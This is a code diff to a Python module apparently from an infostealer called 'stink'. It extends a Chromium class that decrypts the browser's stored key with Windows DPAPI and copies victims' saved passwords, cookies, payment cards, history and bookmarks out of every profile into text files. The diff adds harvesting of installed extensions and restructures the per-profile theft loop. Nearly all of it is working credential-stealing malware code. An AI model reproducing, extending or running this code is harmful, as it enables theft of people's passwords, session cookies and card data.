@@ -2,10 +2,11 @@ from re import compile
 from sqlite3 import connect
 from shutil import copyfile
 from base64 import b64decode
-from json import loads, dump
+from json import load, loads, dump
 from datetime import datetime, timedelta
 from os import path, makedirs, remove, listdir
 from ctypes import windll, byref, cdll, c_buffer
+from distutils.dir_util import copy_tree, remove_tree
 
 from stink.helpers import DataBlob
 from stink.enums.features import Features
@@ -33,7 +34,7 @@ class Chromium:
         if self.__browser_path[-9:] in ["User Data"]:
 
             pattern = compile(r"Default|Profile \d+")
-            return [path.join(self.__browser_path, profile) for profile in sum([pattern.findall(path) for path in listdir(self.__browser_path)], [])]
+            return [rf"{self.__browser_path}\{profile}" for profile in sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])]
 
         return [self.__browser_path]
 
@@ -60,7 +61,11 @@ class Chromium:
     def _get_key(self):
 
         with open(self.__state_path, "r", encoding="utf-8") as state:
-            return self._crypt_unprotect_data(b64decode(loads(state.read())["os_crypt"]["encrypted_key"])[5:])
+            file = state.read()
+
+        state.close()
+
+        return self._crypt_unprotect_data(b64decode(loads(file)["os_crypt"]["encrypted_key"])[5:])
 
     @staticmethod
     def _get_datetime(date):
@@ -93,6 +98,8 @@ class Chromium:
 
         with open(rf"{self.__path}\{args[0]} Passwords.txt", "a", encoding="utf-8") as passwords:
             passwords.write("".join(item for item in set(temp)))
+
+        passwords.close()
 
     def _write_cookies(self, *args):
 
@@ -128,6 +135,8 @@ class Chromium:
         with open(rf"{self.__path}\{args[0]} Cookies.json", "a", encoding="utf-8") as cookies:
             dump(results, cookies)
 
+        cookies.close()
+
     def _write_cards(self, *args):
 
         cards_list = args[1].execute(self.__config.CardsSQL).fetchall()
@@ -143,6 +152,8 @@ class Chromium:
 
         with open(rf"{self.__path}\{args[0]} Cards.txt", "a", encoding="utf-8") as cards:
             cards.write("".join(item for item in set(temp)))
+
+        cards.close()
 
     def _write_history(self, *args):
 
@@ -162,6 +173,8 @@ class Chromium:
         with open(rf"{self.__path}\{args[0]} History.txt", "a", encoding="utf-8") as history:
             history.write("".join(item for item in set(temp)))
 
+        history.close()
+
     def _write_bookmarks(self, *args):
 
         bookmarks_list = sum([self.__config.BookmarksRegex.findall(item) for item in args[1].split("{")], [])
@@ -178,14 +191,79 @@ class Chromium:
         with open(rf"{self.__path}\{args[0]} Bookmarks.txt", "a", encoding="utf-8") as bookmarks:
             bookmarks.write("".join(item for item in set(temp)))
 
-    def _get_browser_paths(self, profile):
-        return (
+        bookmarks.close()
+
+    def _write_extensions(self, *args):
+
+        extensions_list = []
+        extensions_dirs = listdir(args[1])
+
+        if len(extensions_dirs) == 0:
+            return
+
+        for dirpath in extensions_dirs:
+
+            extension_dir = listdir(fr"{args[1]}\{dirpath}")
+
+            if len(extension_dir) == 0:
+                continue
+
+            extension_dir = extension_dir[-1]
+            manifest_path = fr"{args[1]}\{dirpath}\{extension_dir}\manifest.json"
+
+            with open(manifest_path, "r", encoding="utf-8") as file:
+                manifest = load(file)
+                name = manifest.get("name")
+
+                if name:
+                    extensions_list.append(name)
+
+            file.close()
+
+        with open(rf"{self.__path}\{args[0]} Extensions.txt", "a", encoding="utf-8") as extensions:
+            extensions.write("\n".join(item for item in set(extensions_list)))
+
+        extensions.close()
+
+    def _copy_file(self, item, file_path):
+
+        if path.exists(item["path"]):
+            copyfile(item["path"], file_path)
+
+        elif item["alt_path"] and path.exists(item["alt_path"]):
+            copyfile(item["alt_path"], file_path)
+
+        else:
+            if self.__errors is True: print(f'[{self.__browser_name}]: {item["error"]}')
+            return False
+
+        return True
+
+    def _copy_folder(self, item, folder_path):
+
+        if path.exists(item["path"]):
+            copy_tree(item["path"], folder_path)
+
+        elif item["alt_path"] and path.exists(item["alt_path"]):
+            copy_tree(item["alt_path"], folder_path)
+
+        else:
+            if self.__errors is True: print(f'[{self.__browser_name}]: {item["error"]}')
+            return False
+
+        return True
+
+    def _process_profile(self, profile):
+
+        profile_name = profile.replace("\\", "/").split("/")[-1]
+        functions = [
             {
                 "status": True if Features.passwords in self.__statuses else False,
                 "name": "Passwords",
                 "path": rf"{profile}\Login Data",
                 "alt_path": None,
                 "method": self._write_passwords,
+                "file_type": ".db",
                 "error": "No passwords found"
             },
             {
@@ -194,6 +272,7 @@ class Chromium:
                 "path": rf"{profile}\Cookies",
                 "alt_path": rf"{profile}\Network\Cookies",
                 "method": self._write_cookies,
+                "file_type": ".db",
                 "error": "No cookies found"
             },
             {
@@ -202,6 +281,7 @@ class Chromium:
                 "path": rf"{profile}\Web Data",
                 "alt_path": None,
                 "method": self._write_cards,
+                "file_type": ".db",
                 "error": "No cards found"
             },
             {
@@ -210,6 +290,7 @@ class Chromium:
                 "path": rf"{profile}\History",
                 "alt_path": None,
                 "method": self._write_history,
+                "file_type": ".db",
                 "error": "No history found"
             },
             {
@@ -218,67 +299,86 @@ class Chromium:
                 "path": rf"{profile}\Bookmarks",
                 "alt_path": None,
                 "method": self._write_bookmarks,
+                "file_type": None,
                 "error": "No bookmarks found"
+            },
+            {
+                "status": True if Features.extensions in self.__statuses else False,
+                "name": "Extensions",
+                "path": rf"{profile}\Extensions",
+                "alt_path": None,
+                "method": self._write_extensions,
+                "file_type": None,
+                "error": "No extensions found"
             }
-        )
+        ]
 
-    def _check_functions(self):
+        for function in functions:
+
+            try:
+
+                if function["status"] is False:
+                    continue
+
+                if function["name"] in ["Passwords", "Cookies", "Cards", "History"]:
+
+                    file_path = rf"{self.__storage_path}\{self.__browser_name} {profile_name} {function['name']}{function['file_type']}"
+
+                    if not self._copy_file(function, file_path):
+                        continue
+
+                    with connect(file_path) as connection:
+                        connection.text_factory = lambda text: text.decode(errors="ignore")
+                        cursor = connection.cursor()
+
+                        function["method"](profile_name, cursor, self._get_key())
+                        cursor.close()
+
+                    connection.close()
+                    remove(file_path)
+
+                elif function["name"] in ["Bookmarks"]:
+
+                    file_path = rf"{self.__storage_path}\{self.__browser_name} {profile_name} {function['name']}"
+
+                    if not self._copy_file(function, file_path):
+                        continue
+
+                    with open(file_path, "r", encoding="utf-8") as file:
+                        function["method"](profile_name, file.read())
+
+                    file.close()
+                    remove(file_path)
+
+                elif function["name"] in ["Extensions"]:
+
+                    folder_path = rf"{self.__storage_path}\{self.__browser_name} {profile_name}"
+
+                    if not self._copy_folder(function, folder_path):
+                        continue
+
+                    function["method"](profile_name, folder_path)
+
+                    remove_tree(folder_path)
+
+            except Exception as e:
+                if self.__errors is True: print(f"[{self.__browser_name}]: {repr(e)}")
+
+    def _check_profiles(self):
 
         if not self.__profiles:
-            if self.__errors is True: print(f"[{self.__browser_name}]: No profiles found.")
+            if self.__errors is True: print(f"[{self.__browser_name}]: No profiles found")
             return
 
         for profile in self.__profiles:
-
-            functions = self._get_browser_paths(profile)
-
-            for item in functions:
-
-                try:
-
-                    if item["status"] is False:
-                        continue
-
-                    db_format = "" if item["name"] in ["Bookmarks"] else ".db"
-                    profile_name = profile.replace("\\", "/").split("/")[-1]
-                    db_path = rf"{self.__storage_path}\{self.__browser_name} {profile_name} {item['name']}{db_format}"
-
-                    if path.exists(item["path"]):
-                        copyfile(item["path"], db_path)
-
-                    elif item["alt_path"] and path.exists(item["alt_path"]):
-                        copyfile(item["alt_path"], db_path)
-
-                    else:
-                        if self.__errors is True: print(f"[{self.__browser_name}]: {item['error']}")
-                        continue
-
-                    if item["name"] in ["Bookmarks"]:
-                        with open(db_path, "r", encoding="utf-8") as bookmarks:
-                            item["method"](profile_name, bookmarks.read())
-                        bookmarks.close()
-
-                    else:
-                        with connect(db_path) as connection:
-                            connection.text_factory = lambda text: text.decode(errors="ignore")
-                            cursor = connection.cursor()
-
-                            item["method"](profile_name, cursor, self._get_key())
-
-                            cursor.close()
-                        connection.close()
-
-                    remove(db_path)
-
-                except Exception as e:
-                    if self.__errors is True: print(f"[{self.__browser_name}]: {repr(e)}")
+            self._process_profile(profile)
 
     def run(self):
 
         try:
 
             self._check_paths()
-            self._check_functions()
+            self._check_profiles()
 
         except Exception as e:
             if self.__errors is True: print(f"[{self.__browser_name}]: {repr(e)}")
